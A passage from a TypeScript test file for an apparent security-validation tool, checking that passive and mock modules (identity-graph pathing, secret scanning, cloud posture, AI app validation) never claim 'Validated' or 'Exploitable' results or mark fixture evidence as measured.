          targetHost: "dc.corp.example"
        }
      },
      {
        moduleId: "bloodhound.identity_pathing",
        safetyLevel: "PassiveReadOnly",
        target: {
          fixtureGraphPath: path.resolve(
            path.dirname(fileURLToPath(import.meta.url)),
            "../fixtures/bloodhound/identity-graph-fixture.json"
          ),
          graphName: "demo"
        }
      }
    ];

    const bannedProof = new Set([
      "Validated",
      "Exploitable",
      "Fixed",
      "StillExposed"
    ]);

    for (const testCase of cases) {
      const output = await executeModuleById(
        testCase.moduleId,
        createContext({
          runnerId: testCase.runner ? randomUUID() : null,
          safetyLevel: testCase.safetyLevel,
          target: testCase.target
        })
      );
      expect(
        bannedProof.has(String(output.validationState)),
        `${testCase.moduleId} must not mint proof state ${String(output.validationState)}`
      ).toBe(false);
      for (const evidence of output.evidence) {
        expect(
          evidence.attributes.measured === true,
          `${testCase.moduleId} evidence must not set measured:true`
        ).toBe(false);
      }
    }
  });

  it("mock modules never stamp Validated/Exploitable with measured:true", async () => {
    const secret = await executeMockModuleById(
      "mock.github_secret_scan",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: { repository: "acme/demo" }
      })
    );
    expect(secret.validationState).toBe("Inconclusive");
    expect(secret.evidence[0]?.attributes.measured).toBe(false);
    expect(secret.evidence[0]?.attributes.fixture).toBe(true);

    const cloud = await executeMockModuleById(
      "mock.cloud_posture",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: { cloudAccountId: "123456789012" }
      })
    );
    expect(cloud.validationState).toBe("Inconclusive");
    expect(cloud.evidence[0]?.attributes.measured).toBe(false);

    const ai = await executeMockModuleById(
      "mock.ai_app_validation",
      createContext({
        safetyLevel: "ControlledValidation",
        target: {
          endpointUrl: "https://ai.example/v1",
          fixtureOutcome: "LeakageObserved"
        }
      })
    );
    expect(ai.validationState).toBe("Inconclusive");
    expect(ai.evidence[0]?.attributes.measured).toBe(false);
  });
});
